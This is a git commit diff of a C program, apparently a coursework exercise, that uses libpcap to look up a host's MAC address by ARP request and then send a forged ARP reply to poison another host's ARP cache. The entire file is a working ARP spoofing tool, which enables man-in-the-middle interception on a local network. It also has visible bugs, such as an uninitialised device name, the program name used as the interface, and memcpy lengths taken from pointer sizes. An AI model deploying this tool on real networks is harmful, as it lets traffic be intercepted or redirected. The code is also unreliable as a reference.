5ac5505c8c3e7497b3f57a623080742638ec6557
JeongHaewon <JeongHaewon@github.com>
2017-08-07 01:12:53 -0700

    huge reconstruction

--- main.c
+++ main.c
@@ -1,294 +1,243 @@
 #include <pcap.h>
-#include <netinet/ip.h>
-#include <stdint.h>
+#include <netinet/in.h>
 #include <arpa/inet.h>
-#include <netinet/ip.h>
+#include <stdint.h>
 #include <string.h>
-#include <sys/socket.h>
-#include <sys/ioctl.h>
-#include <sys/time.h>
-#include "net/if.h"
-#include "sys/ioctl.h"
-#include <netdb.h>
-#include <ifaddrs.h>
 #include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
 
-typedef struct ether_header
-{
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <net/if.h>
+#include <netinet/if_ether.h>
+#include <net/if_arp.h>
 
-    uint8_t dmac[6];
-    uint8_t smac[6];
-    uint16_t *type;
+#define IP_ADDR_LEN 4
+#define SIZE_ETHER_HEADER 14
+
+#pragma pack(push,1)
+typedef struct ether_hdr{
+
+    u_char dst_mac[ETHER_ADDR_LEN];
+    u_char src_mac[ETHER_ADDR_LEN];
+    uint16_t ether_type;
 
 }ether_t;
 
-typedef struct arp_header
-{
+typedef struct arp_pkt{
 
     uint16_t htype;
     uint16_t ptype;
-    u_char hlen;
-    u_char plen;
+    uint8_t hlen;
+    uint8_t plen;
     uint16_t oper;
-    u_char sha[6];
-    u_char spa[4];
-    u_char tha[6];
-    u_char tpa[4];
+    u_char smac[ETHER_ADDR_LEN];
+    struct in_addr sip;
+    u_char tmac[ETHER_ADDR_LEN];
+    struct in_addr tip;
 
-}arphdr_t;
+}arppkt_t;
+#pragma pack(pop)
 
-
-
-// ###For Reading MAC address: START###
-
-unsigned char cMacAddr[8]; // Server's MAC address
-static int GetSvrMacAddress( char *pIface )
-
-{
-    int nSD; // Socket descriptor
-    struct ifreq sIfReq; // Interface request
-    struct if_nameindex *pIfList; // Ptr to interface name index
-    struct if_nameindex *pListSave; // Ptr to interface name index
-
-    //
-    // Initialize this function
-    //
-    pIfList = (struct if_nameindex *)NULL;
-    pListSave = (struct if_nameindex *)NULL;
-#ifndef SIOCGIFADDR
-    // The kernel does not support the required ioctls
-    return( 0 );
-#endif
-
-    //
-    // Create a socket that we can use for all of our ioctls
-    //
-    nSD = socket( PF_INET, SOCK_STREAM, 0 );
-    if ( nSD < 0 )
-    {
-        // Socket creation failed, this is a fatal error
-        printf( "File %s: line %d: Socket failed\n", __FILE__, __LINE__ );
-        return( 0 );
-    }
-
-    //
-    // Obtain a list of dynamically allocated structures
-    //
-    pIfList = pListSave = if_nameindex();
-
-    //
-    // Walk thru the array returned and query for each interface's
-    // address
-    //
-    for ( pIfList; *(char *)pIfList != 0; pIfList++ )
-    {
-        //
-        // Determine if we are processing the interface that we
-        // are interested in
-        //
-        if ( strcmp(pIfList->if_name, pIface) )
-            // Nope, check the next one in the list
-            continue;
-        strncpy( sIfReq.ifr_name, pIfList->if_name, IF_NAMESIZE );
-
-        //
-        // Get the MAC address for this interface
-        //
-        if ( ioctl(nSD, SIOCGIFHWADDR, &sIfReq) != 0 )
-        {
-            // We failed to get the MAC address for the interface
-            printf( "File %s: line %d: Ioctl failed\n", __FILE__, __LINE__ );
-            return( 0 );
-        }
-        memmove( (void *)&cMacAddr[0], (void *)&sIfReq.ifr_ifru.ifru_hwaddr.sa_data[0], 6 );
-        break;
-    }
-
-    //
-    // Clean up things and return
-    //
-
-    // if_freenameindex( pListSave );    ??
-    // close( nSD ); ??
-    return( 1 );
-}
-
-
+void GettingHostMAC(u_char* buffer, char* if_name);
+void GettingHostIP(struct in_addr* hostip, char* if_name);
+void GettingTargetMAC(pcap_t* handle, u_char* tmac, struct in_addr hostip, const u_char* hostmac, struct in_addr tip);
+void CreatingARP_request(u_char* arp_packet, struct in_addr sip, const u_char* smac, struct in_addr tip);
+void SendingPoisoning_Packet(pcap_t* handle, const u_char* hostmac, const u_char* smac, struct in_addr tip, struct in_addr sip);
 
 
 int main(int argc, char * argv[])
 {
-
-    char *dev;
-    int snaplen=2048;
-    int promisc=1;
-    int to_ms=1000;
-    char errbuf[PCAP_ERRBUF_SIZE];
-    dev="ens33";
-
-    int number, i;
-    uint8_t hostip[6];
-
-
-    int domains[] = { AF_INET, AF_INET6 };
-
-
-    bzero( (void *)&cMacAddr[0], sizeof(cMacAddr) );
-    if ( !GetSvrMacAddress(dev) )
+    if(argc != 3)
     {
-        // We failed to get the local host's MAC address
-        printf( "Fatal error: Failed to get local host's MAC address\n" );
+        fprintf(stderr,"Please Type: [INTERFACE_NAME] [SENDER_IP] [TARGET_IP]\n");
+        return 2;
     }
-    printf( "HOST MAC ADDRESS: %02X:%02X:%02X:%02X:%02X:%02X\n",
-            cMacAddr[0], cMacAddr[1], cMacAddr[2],
-            cMacAddr[3], cMacAddr[4], cMacAddr[5] );
 
-    // ###For Reading MAC address: FINISH###
-
-
-    uint8_t gatemac[6];
-    uint8_t targetmac[6];
-
-    arphdr_t* arpheader;
-    ether_t *etherheader;
-
-
-    struct pcap_pkthdr *pkthdr;
-    const u_char *pkt_data;
-
+    char *dev, errbuf[PCAP_ERRBUF_SIZE];
+    int promisc = 1;
+    int to_ms = 0;
     pcap_t *handle;
-    handle = pcap_open_live(dev, snaplen, promisc, to_ms, errbuf);
 
+    printf("Device: %s\n", argv[0]);
+    handle = pcap_open_live(dev, BUFSIZ, promisc, to_ms, errbuf);
 
-    if (handle == NULL) {
-
-        printf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
-        return(2);
-    }
-
-
-    u_char packet[42];
-
-    for(i=0; i<6; i++)packet[i]=255; // 0xFF (BROADCAST)
-
-    packet[6]= cMacAddr[0]; //HOST MAC ADDRESS
-    packet[7]= cMacAddr[1];
-    packet[8]= cMacAddr[2];
-    packet[9]= cMacAddr[3];
-    packet[10]= cMacAddr[4];
-    packet[11]= cMacAddr[5];
-
-    packet[12]= 8;
-    packet[13]= 6;
-
-    packet[14]= 0;
-    packet[15]= 1;
-    packet[16]= 8; //IPv4 0x0800
-    packet[17]= 0;
-    packet[18]= 6; //Hardware size 0x06
-    packet[19]= 4; //Protocol size 0x04
-    packet[20]= 0;
-    packet[21]= 1; //Resquest
-
-    for(int i=22;i<28;i++)packet[i]=packet[i-16]; //HOST MAC ADDRESS
-
-    packet[28]=argv[1]; //HOST IP ADDRESS
-    packet[29]=argv[2];
-    packet[30]=argv[3];
-    packet[31]=argv[4];
-
-    for(int i=32;i<6;i++)packet[i]=0;
-
-    for(int i=32;i<6;i++)packet[i]=0; //DO NOT KNOW TARGET'S MAC
-
-    packet[38]=argv[5];
-    packet[39]=argv[6];
-    packet[40]=argv[7];
-    packet[41]=argv[8];
-
-
-    if (pcap_sendpacket(handle ,packet ,sizeof(packet)) != 0)
+    if(handle == NULL)
     {
-        printf("Packet sending Failure\n");
+        fprintf(stderr, "Couldn't open device! %s: %s\n", dev, errbuf);
+        return 2;
     }
 
-    else
-    {
-        while((number = pcap_next_ex(handle, &pkthdr, &pkt_data)) >= 0)
-        {
+    u_char hostmac[6];
+    u_char smac[6];
 
-            if(number == 0)
-            {
-                printf("Packet buffer time Expired\n");
-                continue;
-            }
-
-            if(packet != NULL)
-            {
-                etherheader=(ether_t*)packet;
-
-                if(ntohs(etherheader->type)==1544)
-                {
-                    arpheader=(arphdr_t*)(packet+14);
-                    for(int i=0;i<6;i++)targetmac[i]=arpheader->sha[i];
-                    for(i=0; i<6; i++)printf("TARGET MAC: %02x", targetmac[i]);
-                }
-            }
-        }
-    }
-
-    packet[0]= targetmac[0];
-    packet[1]= targetmac[1];
-    packet[2]= targetmac[2];
-    packet[3]= targetmac[3];
-    packet[4]= targetmac[4];
-    packet[5]= targetmac[5];
-
-    packet[6]= cMacAddr[0]; //HOST MAC
-    packet[7]= cMacAddr[1];
-    packet[8]= cMacAddr[2];
-    packet[9]= cMacAddr[3];
-    packet[10]= cMacAddr[4];
-    packet[11]= cMacAddr[5];
-
-    packet[12]= 8;
-    packet[13]= 6;
-
-    packet[14]= 0;
-    packet[15]= 1;
-    packet[16]= 8; //IPv4 0x0800
-    packet[17]= 0;
-    packet[18]= 6; //Hardware size 0x06
-    packet[19]= 4; //Protocol size 0x04
-    packet[20]= 0;
-    packet[21]= 1; //Resquest
-
-    for(int i=0;i<5;i++)packet[i+22]=targetmac[i]; //GATEWAY MAC
-    packet[27]= 0x01;
-
-    packet[28]=argv[1]; //HOST IP ADDRESS
-    packet[29]=argv[2];
-    packet[30]=argv[3];
-    packet[31]=argv[4];
-
-    for(int i=0;i<6;i++)packet[i+32]=targetmac[i];
-
-    packet[38]=argv[5];
-    packet[39]=argv[6];
-    packet[40]=argv[7];
-    packet[41]=argv[8];
+    struct in_addr hostip;
+    struct in_addr sip;
+    struct in_addr tip;
 
 
-    while(1)
-    {
-        if (pcap_sendpacket(handle ,packet ,sizeof(packet)) != 0)
-            printf("Packet sending Failure\n");
-    }
+    GettingHostMAC(hostmac, argv[0]);
+    GettingHostIP(&hostip, argv[0]);
+    sip.s_addr = inet_addr(argv[1]);
+    tip.s_addr = inet_addr(argv[2]);
 
+    printf("Sender IP: %s\n", argv[1]);
+    printf("Target IP: %s\n", argv[2]);
+
+    GettingTargetMAC(handle, smac, hostip, hostmac, sip);
+    SendingPoisoning_Packet(handle, hostmac, smac, tip, sip);
+
+    pcap_close(handle);
     return 0;
 }
 
 
+//Getting Host Mac
+void GettingHostMAC(u_char* buffer, char* if_name)
+{
+    struct ifreq myreq;
+    int s, sock;
 
+    sock = socket(PF_INET,SOCK_DGRAM,0);
+    memset(&myreq, 0x00, sizeof(myreq));
+    strcpy(myreq.ifr_name, if_name);
+    ioctl(sock, SIOCGIFHWADDR, &myreq);
+    close(sock);
+
+    for(s=0;s<6;s++)buffer[s] = (u_char)myreq.ifr_hwaddr.sa_data[s];
+
+    return;
+}
+//Getting Host IP
+void GettingHostIP(struct in_addr* hostip, char* if_name)
+{
+    struct ifreq myreq;
+    int sock;
+
+    sock = socket(AF_INET, SOCK_DGRAM, 0);
+    myreq.ifr_addr.sa_family = AF_INET;
+    strncpy(myreq.ifr_name, if_name, IFNAMSIZ-1);
+    ioctl(sock, SIOCGIFADDR, &myreq);
+    close(sock);
+    *hostip = ((struct sockaddr_in*)&myreq.ifr_addr)->sin_addr;
+    return;
+}
+//Getting Target MAC
+void GettingTargetMAC(pcap_t* handle, u_char* tmac, struct in_addr hostip, const u_char* hostmac, struct in_addr tip)
+{
+    u_char arp_packet[42];
+    CreatingARP_request(arp_packet, hostip, hostmac, tip);
+
+    struct pcap_pkthdr* pkthdr;
+    const u_char* pkt_data;
+    ether_t* p_ethhdr;
+    arppkt_t* arppacket;
+    int number = 0;
+
+
+    while(1)
+    {
+        if(pcap_sendpacket(handle,arp_packet,sizeof(arp_packet)) != 0)
+        {
+            printf("Packet sending Failure!\n");
+        }
+
+        number = pcap_next_ex(handle, &pkthdr,&pkt_data);
+        if(number == 1)
+        {
+            p_ethhdr = (ether_t*)pkt_data;
+
+            if(ntohs(p_ethhdr->ether_type) == ETHERTYPE_ARP)
+            {
+                arppacket = (arppkt_t*)(pkt_data+SIZE_ETHER_HEADER);
+                if((arppacket->sip.s_addr == tip.s_addr) && (ntohs(arppacket->oper) == ARPOP_REPLY))
+                {
+                    for(int i=0;i<6;i++)tmac[i] = (arppacket->smac)[i];
+                    for(int i=0;i<6;i++)printf("TARGET MAC: %02x", tmac[i]);
+                    break;
+                }
+                else
+                    continue;
+            }
+            else
+                continue;
+        }
+        else
+        {
+            if(number == 0)
+            {
+                printf("Packet buffer time Expired!\n");
+                return;
+            }
+            else if(number == -1)
+            {
+                printf("An Error Occured: %s\n", pcap_geterr(handle));
+                return;
+            }
+            else if(number == -2)
+            {
+                printf("No more packets to read from the savefile!\n");
+                return;
+            }
+        }
+    }
+
+    return;
+}
+
+void CreatingARP_request(u_char* arp_packet, struct in_addr sip, const u_char* smac, struct in_addr tip)
+{
+    ether_t* eth_header=(ether_t*)arp_packet;
+    arppkt_t* arp_pkt = (arppkt_t*)(arp_packet+SIZE_ETHER_HEADER);
+    u_char emptyMAC[6] = {0,};
+
+    memset(eth_header->dst_mac,0xff,6);
+    memcpy(eth_header->src_mac,smac,sizeof(smac));
+    eth_header->ether_type = htons(ETHERTYPE_ARP);
+
+    arp_pkt->htype = htons(ARPHRD_ETHER);
+    arp_pkt->ptype = htons(ETHERTYPE_IP);
+    arp_pkt->hlen = 6;
+    arp_pkt->plen = 4;
+    arp_pkt->oper = htons(ARPOP_REQUEST);
+
+    memcpy(arp_pkt->smac,smac,sizeof(smac));
+    memcpy(arp_pkt->tmac,emptyMAC,sizeof(emptyMAC));
+    arp_pkt->sip = sip;
+    arp_pkt->tip = tip;
+    return;
+}
+
+void CreatingARP_reply(u_char* arp_packet, struct in_addr sip, const u_char* smac, struct in_addr tip, const u_char* tmac)
+{
+    ether_t* eth_header=(ether_t*)arp_packet;
+    arppkt_t* arp_pkt = (arppkt_t*)(arp_packet+SIZE_ETHER_HEADER);
+
+    memcpy(eth_header->dst_mac,tmac,sizeof(tmac));
+    memcpy(eth_header->src_mac,smac,sizeof(smac));
+    eth_header->ether_type = htons(ETHERTYPE_ARP);
+
+    arp_pkt->htype=htons(ARPHRD_ETHER);
+    arp_pkt->ptype = htons(ETHERTYPE_IP);
+    arp_pkt->hlen = 6;
+    arp_pkt->plen = 4;
+    arp_pkt->oper = htons(ARPOP_REPLY);
+
+    memcpy(arp_pkt->smac,smac,sizeof(smac));
+    memcpy(arp_pkt->tmac,tmac,sizeof(tmac));
+    arp_pkt->sip = sip;
+    arp_pkt->tip = tip;
+    return;
+}
+
+void SendingPoisoning_Packet(pcap_t* handle, const u_char* hostmac, const u_char* smac, struct in_addr tip, struct in_addr sip)
+{
+    u_char poison_packet[42];
+    CreatingARP_reply(poison_packet, tip, hostmac, sip, smac);
+
+    if(pcap_sendpacket(handle,poison_packet,sizeof(poison_packet)) != 0)
+    {
+        printf("ARP Request Packet sending Failure\n");
+    }
+    return;
+}
